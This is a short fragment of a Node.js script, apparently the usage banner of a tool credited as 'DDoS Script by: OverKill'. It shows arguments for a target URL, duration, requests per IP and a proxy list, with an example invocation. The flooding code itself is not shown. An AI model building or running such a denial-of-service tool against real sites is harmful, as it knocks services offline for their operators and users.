...
\x1b[36m USAGE\x1b[37m: node ${path.basename(__filename)} [URL] [TIME] [REQ_PER_IP] [PROXYLIST]
\x1b[32m EXAMPLE\x1b[37m: node ${path.basename(__filename)} http://example.com 60 100 http.txt
\x1b[93m DDoS Script by:\x1b[34m OverKill `);
    process.exit(0);
}
